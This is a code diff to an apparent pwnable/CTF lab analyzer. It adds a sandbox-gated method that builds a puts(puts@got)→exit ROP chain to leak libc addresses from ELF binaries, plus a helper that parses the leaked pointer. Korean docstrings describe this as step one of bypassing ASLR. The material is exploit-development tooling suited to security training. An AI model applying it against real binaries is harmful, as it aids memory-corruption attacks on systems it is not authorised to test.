@@ -25,6 +25,7 @@ from pwnable_lab.analyzer.strategy import (
     binary_exec_range,
     find_ret_gadget,
     inject_confirmed_offset,
+    leak_plan,
     ret2system_plan,
     ret2win_target,
 )
@@ -499,6 +500,43 @@ class AnalysisService:
             markers=markers,
             settings=self.settings,
         )
+
+    def verify_leak(
+        self, data: bytes, *, offset: int, bits: int | None = None
+    ) -> dict:
+        """puts(puts@got) → exit 체인으로 런타임 libc 주소를 유출한다(amd64).
+
+        ``puts`` 가 GOT 슬롯의 값(런타임 libc 주소)을 출력하고 ``exit`` 로 깨끗이
+        종료해 stdio 버퍼를 flush 한다 → 유출 바이트를 stdout 에서 회수한다.
+        ASLR 우회(libc base 계산)의 1단계 primitive.
+        """
+
+        require_sandbox_enabled(self.settings)
+        self._require_format(data, ArtifactFormat.ELF, feature="Libc leak")
+        image = parse_elf(data)
+        plan = leak_plan(image)
+        if plan is None:
+            return {"attempted": False, "reason": "no-leak-plan"}
+        resolved_bits = bits or image.bits or 64
+        result = self.verify_exploit(
+            data,
+            offset=offset,
+            target=plan["pop_rdi"],
+            chain=[plan["got_target"], plan["puts_plt"], plan["exit_plt"]],
+            bits=resolved_bits,
+        )
+        leaked = _parse_leaked_address(result)
+        ok = leaked is not None and leaked > 0x1000
+        return {
+            "attempted": True,
+            "technique": "libc-leak-puts",
+            "got_target_hex": f"0x{plan['got_target']:x}",
+            "leaked_addr": leaked,
+            "leaked_hex": None if leaked is None else f"0x{leaked:x}",
+            "succeeded": ok,
+            "reason": "leaked" if ok else "no-leak",
+            "result": result,
+        }
 
     def _run_offset_confirmation(
         self, data: bytes, *, pattern_length: int | None, feature: str
@@ -1055,3 +1093,23 @@ def _page(items: list[dict], *, offset: int, limit: int) -> dict:
         "offset": offset,
         "limit": limit,
     }
+
+
+def _parse_leaked_address(verification: dict) -> int | None:
+    """leak 체인 실행 결과의 stdout(hex)에서 유출된 포인터를 복원한다.
+
+    ``puts`` 는 GOT 슬롯 바이트를 null 까지 출력한 뒤 개행을 붙이므로, 첫 줄
+    바이트를 리틀엔디언 정수로 해석한다. 유출이 없으면 None.
+    """
+
+    hexstr = verification.get("observation", {}).get("stdout_hex")
+    if not hexstr:
+        return None
+    try:
+        raw = bytes.fromhex(hexstr)
+    except ValueError:
+        return None
+    line = raw.split(b"\n", 1)[0]
+    if not line:
+        return None
+    return int.from_bytes(line[:8], "little")
